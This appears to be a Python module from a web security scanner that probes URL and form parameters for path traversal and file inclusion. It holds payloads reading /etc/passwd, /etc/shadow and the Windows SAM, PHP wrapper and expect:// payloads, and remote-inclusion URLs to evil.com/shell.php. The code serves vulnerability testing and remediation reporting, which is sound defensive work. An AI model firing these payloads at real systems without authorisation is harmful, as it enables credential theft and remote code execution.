"""Path Traversal and File Inclusion vulnerability scanner."""

import re
import requests
import hashlib
import os
import time
import secrets
import string
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote, unquote

from .base import BaseScanner
from ..models.scan import ScanTarget
from ..models.finding import Finding, FindingSeverity, FindingCategory
from ..models.scan_mode import ScanMode
from ..utils.evidence_collector import EvidenceCollector

import logging
logger = logging.getLogger(__name__)


class PathTraversalScanner(BaseScanner):
    """Scanner for Path Traversal and File Inclusion vulnerabilities."""
    
    def __init__(self, enabled: bool = True, scan_mode: ScanMode = ScanMode.DEFENSIVE, exhaustive: bool = False):
        """
        Initialize Path Traversal scanner.
        
        Args:
            enabled: Whether scanner is enabled
            scan_mode: Scan mode (defensive or offensive)
            exhaustive: If True, test all payloads/parameters (slower but more thorough).
                       If False, use optimized set (faster, standard mode).
        """
        super().__init__(
            name="path_traversal",
            command=None,  # No external command needed
            enabled=enabled,
            scan_mode=scan_mode
        )
        self.exhaustive = exhaustive
        # Use OPSEC-enabled session helper
        from ..utils.scanner_session import create_scanner_session
        self.session = create_scanner_session()
        self.session.timeout = 10
        
        # Generate unique test marker for file content verification
        import secrets
        import string
        self.test_marker = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))
        self.unique_test_string = f"PATH_TRAVERSAL_TEST_{self.test_marker}"
        
        # Path traversal payloads
        self.traversal_payloads = [
            # Basic path traversal
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            
            # Encoded variations
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            
            # Double encoding
            '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
            
            # Null byte injection
            '../../../etc/passwd%00',
            '../../../etc/passwd\x00',
            
            # Windows variations
            '..\\..\\..\\windows\\win.ini',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '..%5c..%5c..%5cwindows%5cwin.ini',
            
            # PHP wrappers (for LFI/RFI)
            'php://filter/read=string.rot13/resource=../../../etc/passwd',
            'php://filter/convert.base64-encode/resource=../../../etc/passwd',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',  # <?php phpinfo(); ?>
            'expect://id',
            'file:///etc/passwd',
            
            # Remote file inclusion (RFI)
            'http://evil.com/shell.php',
            'https://evil.com/shell.php',
            'ftp://evil.com/shell.php',
        ]
        
        # Files to test for disclosure
        self.test_files = {
            'linux': [
                '/etc/passwd',
                '/etc/shadow',
                '/etc/hosts',
                '/etc/group',
                '/proc/version',
                '/proc/self/environ',
                '/etc/issue',
                '/etc/motd',
            ],
            'windows': [
                'C:\\windows\\win.ini',
                'C:\\windows\\system32\\drivers\\etc\\hosts',
                'C:\\windows\\system.ini',
                'C:\\boot.ini',
            ],
            'web': [
                '/etc/passwd',
                '/proc/self/environ',
                '/var/www/html/index.php',
                '/var/log/apache2/access.log',
                '/var/log/nginx/access.log',
            ],
        }
    
    def is_available(self) -> bool:
        """Path traversal scanner is always available."""
        return True
    
    def scan(self, target: ScanTarget) -> List[Finding]:
        """Run path traversal and file inclusion tests."""
        if self.scan_mode == ScanMode.DEFENSIVE:
            return []  # Only run in offensive mode
        
        findings = []
        
        # Test URL parameters
        findings.extend(self._test_url_parameters(target.url))
        
        # Test POST parameters
        findings.extend(self._test_post_parameters(target.url))
        
        # Test common file inclusion endpoints
        findings.extend(self._test_file_inclusion_endpoints(target.url))
        
        return findings
    
    def _test_url_parameters(self, url: str) -> List[Finding]:
        """Test URL parameters for path traversal."""
        findings = []
        
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Common file inclusion parameter names
            file_params = ['file', 'page', 'path', 'include', 'doc', 'document', 
                          'folder', 'path', 'style', 'pdf', 'template', 'view',
                          'content', 'document', 'doc', 'filename', 'pathinfo']
            
            # Test existing parameters that look file-related
            for param in params.keys():
                if any(keyword in param.lower() for keyword in ['file', 'path', 'page', 'include', 'doc', 'template']):
                    findings.extend(self._test_parameter(url, param, 'GET'))
            
            # Also test common parameter names if not present
            # In exhaustive mode, test all parameters; otherwise limit to top 8
            params_to_test = file_params if self.exhaustive else file_params[:8]
            for param in params_to_test:
                if param not in params:
                    findings.extend(self._test_parameter(url, param, 'GET'))
        except Exception as e:
            logger.debug(f"Error testing URL parameters: {e}")
        
        return findings
    
    def _test_post_parameters(self, url: str) -> List[Finding]:
        """Test POST parameters for path traversal."""
        findings = []
        
        try:
            response = self.session.get(url, timeout=10)
            if response.status_code == 200:
                # Look for form inputs
                form_inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', response.text, re.IGNORECASE)
                
                # Test file-related parameters
                file_params = ['file', 'path', 'include', 'template', 'view']
                for input_name in form_inputs:
                    if any(keyword in input_name.lower() for keyword in file_params):
                        findings.extend(self._test_parameter(url, input_name, 'POST'))
        except Exception as e:
            logger.debug(f"Error testing POST parameters: {e}")
        
        return findings
    
    def _test_file_inclusion_endpoints(self, url: str) -> List[Finding]:
        """Test common file inclusion endpoints."""
        findings = []
        
        # In exhaustive mode, test all endpoints; otherwise limit to most common
        if self.exhaustive:
            common_endpoints = [
                '/include.php',
                '/include',
                '/view.php',
                '/view',
                '/file.php',
                '/file',
                '/page.php',
                '/page',
                '/template.php',
                '/template',
                '/load.php',
                '/load',
            ]
        else:
            # Standard mode: Limit to most common endpoints to reduce scan time
            common_endpoints = [
                '/include.php',
                '/view.php',
                '/file.php',
                '/page.php',
                '/template.php',
                '/load.php',
            ]
        
        for endpoint in common_endpoints:
            test_url = urljoin(url, endpoint)
            try:
                # Test with file parameter
                findings.extend(self._test_parameter(test_url, 'file', 'GET'))
            except:
                continue
        
        return findings
    
    def _test_parameter(self, url: str, param_name: str, method: str = 'GET') -> List[Finding]:
        """Test a parameter for path traversal vulnerabilities."""
        findings = []
        
        # In exhaustive mode, test all payloads; otherwise limit to most effective ones
        if self.exhaustive:
            payloads_to_test = self.traversal_payloads  # Test all 22+ payloads
        else:
            # Standard mode: Limit to top 12 most effective payloads to reduce scan time
            max_payloads = 12
            payloads_to_test = self.traversal_payloads[:max_payloads]
        
        # Test each payload
        for payload in payloads_to_test:
            try:
                if method == 'GET':
                    # Build URL with payload
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urlencode(params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                    
                    response = self.session.get(test_url, timeout=10)
                else:
                    # POST with payload
                    data = {param_name: payload}
                    response = self.session.post(url, data=data, timeout=10)
                
                response_text = response.text
                
                # Get baseline response for comparison
                try:
                    parsed = urlparse(url)
                    baseline_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    baseline_response = self.session.get(baseline_url, timeout=10)
                    baseline_text = baseline_response.text
                except:
                    baseline_text = ""
                
                # Check for file disclosure indicators
                is_vulnerable = False
                exploitation_details = {}
                disclosed_file = None
                verification_level = 'unverified'
                
                # Check for /etc/passwd content - require MULTIPLE indicators to reduce false positives
                if '/etc/passwd' in payload or 'passwd' in payload:
                    # Require both 'root:' AND '/bin/' to appear, and not in baseline
                    root_in_response = 'root:' in response_text
                    bin_in_response = '/bin/' in response_text or '/bin/bash' in response_text or '/bin/sh' in response_text
                    root_in_baseline = 'root:' in baseline_text
                    bin_in_baseline = '/bin/' in baseline_text or '/bin/bash' in baseline_text or '/bin/sh' in baseline_text
                    
                    # Strong verification: both patterns must appear AND not be in baseline
                    if root_in_response and bin_in_response:
                        if not root_in_baseline or not bin_in_baseline:
                            # Additional check: look for passwd file format (username:password:uid:gid:...)
                            if re.search(r'root:.*:\d+:\d+:', response_text):
                                is_vulnerable = True
                                verification_level = 'verified'
                                disclosed_file = '/etc/passwd'
                                exploitation_details['file_disclosed'] = '/etc/passwd'
                                exploitation_details['content_type'] = 'system_file'
                                exploitation_details['verification'] = 'multiple_indicators'
                    # Fallback: If only root: appears (not in baseline), still report as POTENTIAL
                    # Real files might be partially read or have different formatting
                    elif root_in_response and not root_in_baseline:
                        # Check for passwd-like format even without /bin/
                        if re.search(r'root:.*:\d+:\d+:', response_text):
                            is_vulnerable = True
                            verification_level = 'potential'  # Not fully verified but likely
                            disclosed_file = '/etc/passwd'
                            exploitation_details['file_disclosed'] = '/etc/passwd'
                            exploitation_details['content_type'] = 'system_file'
                            exploitation_details['verification'] = 'single_indicator_with_format'
                            exploitation_details['note'] = 'Passwd format detected with root: pattern, but /bin/ indicator missing. May indicate partial file read.'
                
                # Check for Windows files
                elif 'win.ini' in payload.lower():
                    fonts_in_response = '[fonts]' in response_text
                    extensions_in_response = '[extensions]' in response_text
                    fonts_in_baseline = '[fonts]' in baseline_text
                    extensions_in_baseline = '[extensions]' in baseline_text
                    
                    # Require at least one indicator and it must not be in baseline
                    if (fonts_in_response or extensions_in_response):
                        if not fonts_in_baseline and not extensions_in_baseline:
                            is_vulnerable = True
                            verification_level = 'verified'
                            disclosed_file = 'C:\\windows\\win.ini'
                            exploitation_details['file_disclosed'] = 'C:\\windows\\win.ini'
                            exploitation_details['content_type'] = 'system_file'
                            exploitation_details['verification'] = 'pattern_match'
                
                # Check for PHP wrapper execution - this is strong verification if phpinfo() output appears
                elif 'php://' in payload or 'data://' in payload:
                    php_version_in_response = 'PHP Version' in response_text
                    phpinfo_in_response = 'phpinfo()' in response_text or 'PHP Extension' in response_text
                    php_version_in_baseline = 'PHP Version' in baseline_text
                    phpinfo_in_baseline = 'phpinfo()' in baseline_text or 'PHP Extension' in baseline_text
                    
                    if (php_version_in_response or phpinfo_in_response):
                        if not php_version_in_baseline and not phpinfo_in_baseline:
                            # PHP wrapper execution is strong evidence
                            is_vulnerable = True
                            verification_level = 'verified'
                            disclosed_file = 'PHP wrapper'
                            exploitation_details['file_disclosed'] = 'PHP wrapper execution'
                            exploitation_details['content_type'] = 'code_execution'
                            exploitation_details['rce_possible'] = True
                            exploitation_details['verification'] = 'phpinfo_output'
                
                # Check for remote file inclusion - skip (hard to verify without control)
                elif payload.startswith('http://') or payload.startswith('https://'):
                    # RFI test - check if external content is included
                    # Skip for now to avoid false positives - would need controlled server to verify
                    pass
                
                # Check for other system files - be very strict to avoid false positives
                else:
                    # Look for common file content patterns, but require they're not in baseline
                    root_pattern = 'root:' in response_text and 'root:' not in baseline_text
                    boot_pattern = '[boot loader]' in response_text and '[boot loader]' not in baseline_text
                    
                    # Require at least one strong pattern
                    if root_pattern or boot_pattern:
                        # Additional verification: ensure it's actual file content, not just text
                        if root_pattern:
                            # Check for passwd-like format
                            if re.search(r'root:.*:\d+:\d+:', response_text):
                                is_vulnerable = True
                                verification_level = 'verified'
                                disclosed_file = 'system_file'
                                exploitation_details['file_disclosed'] = 'system_file'
                                exploitation_details['content_type'] = 'system_file'
                                exploitation_details['verification'] = 'pattern_format'
                        elif boot_pattern:
                            is_vulnerable = True
                            verification_level = 'verified'
                            disclosed_file = 'system_file'
                            exploitation_details['file_disclosed'] = 'system_file'
                            exploitation_details['content_type'] = 'system_file'
                            exploitation_details['verification'] = 'boot_loader_format'
                
                if is_vulnerable:
                    # Convert exploitation_details dict to string
                    if exploitation_details:
                        details_parts = []
                        if 'file_disclosed' in exploitation_details:
                            details_parts.append(f"File disclosed: {exploitation_details['file_disclosed']}")
                        if 'content_type' in exploitation_details:
                            details_parts.append(f"Content type: {exploitation_details['content_type']}")
                        if exploitation_details.get('rce_possible'):
                            details_parts.append("Remote code execution possible")
                        exploitation_details_str = "; ".join(details_parts)
                    else:
                        exploitation_details_str = f"Path traversal vulnerability confirmed. File accessed: {disclosed_file}"
                    
                    # Determine severity
                    if exploitation_details.get('rce_possible'):
                        severity = FindingSeverity.CRITICAL  # RCE = CRITICAL
                    elif disclosed_file and 'passwd' in disclosed_file:
                        severity = FindingSeverity.HIGH  # System file disclosure = HIGH
                    else:
                        severity = FindingSeverity.MEDIUM
                    
                    # Found vulnerability - stop testing more payloads for this parameter
                    # Small delay to avoid rate limiting
                    time.sleep(0.1)
                    # Adjust title and description based on verification level
                    if verification_level == 'verified':
                        title = f"Path Traversal / File Inclusion Vulnerability in {param_name} Parameter (VERIFIED)"
                        description = (f"Path traversal vulnerability VERIFIED in the '{param_name}' parameter ({method}). "
                                      f"The application allows reading arbitrary files from the server filesystem. "
                                      f"Disclosed file: {disclosed_file or 'unknown'}. "
                                      f"Verification: {exploitation_details.get('verification', 'pattern_match')}. "
                                      f"{'Remote code execution may be possible via PHP wrappers.' if exploitation_details.get('rce_possible') else ''}")
                        finding_category = FindingCategory.EXPLOITATION
                    elif verification_level == 'potential':
                        title = f"Path Traversal / File Inclusion Vulnerability in {param_name} Parameter (LIKELY)"
                        description = (f"Path traversal vulnerability LIKELY detected in the '{param_name}' parameter ({method}). "
                                      f"File content pattern with proper format detected (not in baseline). "
                                      f"Disclosed file: {disclosed_file or 'unknown'}. "
                                      f"Verification: {exploitation_details.get('verification', 'single_indicator')}. "
                                      f"Note: {exploitation_details.get('note', 'Partial verification - manual review recommended.')}")
                        finding_category = FindingCategory.EXPLOITATION
                        severity = FindingSeverity.HIGH  # HIGH for likely but not fully verified
                    else:
                        title = f"Potential Path Traversal in {param_name} Parameter (UNVERIFIED)"
                        description = (f"Potential path traversal vulnerability detected in the '{param_name}' parameter ({method}). "
                                      f"File content patterns detected, but verification level: {verification_level}. "
                                      f"This may be a false positive from input reflection or template evaluation. "
                                      f"Manual verification recommended.")
                        finding_category = FindingCategory.VULNERABILITY
                        severity = FindingSeverity.MEDIUM  # Lower severity for unverified
                    
                    findings.append(Finding(
                        title=title,
                        description=description,
                        severity=severity,
                        category=finding_category,
                        exploitation_details=exploitation_details_str,
                        source_scanner="path_traversal",
                        source_id=f"path_traversal_{param_name}_{method}",
                        url=url if method == 'GET' else f"{url} (POST)",
                        remediation=f"Sanitize and validate all user input in the '{param_name}' parameter. "
                                   f"1. Use whitelist of allowed file paths "
                                   f"2. Remove path traversal sequences (../, ..\\) "
                                   f"3. Use basename() to get only filename "
                                   f"4. Store files outside web root "
                                   f"5. Disable dangerous PHP wrappers (php://, data://, expect://) "
                                   f"6. Use absolute paths with validation",
                        metadata={
                            "parameter": param_name,
                            "method": method,
                            "payload": payload,
                            "disclosed_file": disclosed_file,
                            "exploitation_details": exploitation_details,
                            "vulnerable": True,
                        },
                        references=[
                            "https://owasp.org/www-community/attacks/Path_Traversal",
                            "https://portswigger.net/web-security/file-path-traversal",
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
                        ],
                    ))
                    break  # Found vulnerability, no need to test more payloads
                
                # Small delay to avoid rate limiting
                # In exhaustive mode, use longer delay (0.2s) for more thorough testing
                # In standard mode, use shorter delay (0.1s) for faster scans
                delay = 0.2 if self.exhaustive else 0.1
                time.sleep(delay)
                
            except Exception as e:
                logger.debug(f"Error testing payload {payload} on {param_name}: {e}")
                continue
        
        return findings

